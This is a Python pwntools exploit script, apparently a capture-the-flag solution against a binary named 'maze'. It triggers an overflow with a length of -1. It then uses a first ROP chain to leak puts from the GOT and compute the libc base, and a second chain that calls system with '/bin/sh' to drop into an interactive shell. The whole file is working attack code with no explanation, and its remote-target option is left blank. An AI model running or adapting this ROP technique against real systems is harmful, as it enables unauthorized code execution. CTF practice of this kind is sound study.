from pwn import *
# from LibcSearcher import *
# context.log_level='debug'
debug = 1
file_name = './maze'
libc_name = '/lib/x86_64-linux-gnu/libc.so.6'
ip = ''
prot = ''
if debug:
    r = process(file_name)
    libc = ELF(libc_name)
else:
    r = remote(ip,int(prot))
    libc = ELF(libc_name)

def debug():
    gdb.attach(r)
    raw_input()


file = ELF(file_name)
sl = lambda x : r.sendline(x)
sd = lambda x : r.send(x)
sla = lambda x,y : r.sendlineafter(x,y)
rud = lambda x : r.recvuntil(x,drop=True)
ru = lambda x : r.recvuntil(x)
li = lambda name,x : log.info(name+':'+hex(x))
ri = lambda  : r.interactive()

ru("please input the length:")
sl("-1")
ru("please input the maze:")
f = open("./payload2.txt","rb+")
start_addr = 0x401110
p_rdi = 0x0000000000401aeb# : pop rdi ; ret
puts_plt = file.plt['puts']
puts_got = file.got['puts']
ROP_payload = p64(p_rdi)+p64(puts_got)+p64(puts_plt)+p64(start_addr)
pp = ""
for x in range(0,len(ROP_payload),4):
    pp += str(int(eval("0x"+ROP_payload[x:x+4][::-1].encode("hex"))))
    pp += " "
print pp


payload = f.read()
payload = payload.replace("thisispayload",pp)
sl(payload)

rud("bye bye\n")
libc_base = u64(r.recv(6)+"\x00\x00")-libc.symbols['puts']
li("libc_base",libc_base)
system = libc.symbols['system']+libc_base
binsh = 0x00000000001b75aa+libc_base
li("system",system)
li("binsh",binsh)

# print puts_got

ROP_payload = p64(p_rdi)+p64(binsh)+p64(0x0401A16)+p64(system)

# print ROP_payload.encode("hex")
pp = ""
for x in range(0,len(ROP_payload),4):
    pp += str(int(eval("0x"+ROP_payload[x:x+4][::-1].encode("hex"))))
    pp += " "
print pp

ru("please input the length:")
sl("-1")
# debug()
ru("please input the maze:")
f_2 = open("./payload2.txt","rb+")
payload_2 = f_2.read()
payload_2 = payload_2.replace("thisispayload",pp)
sl(payload_2)
ri()
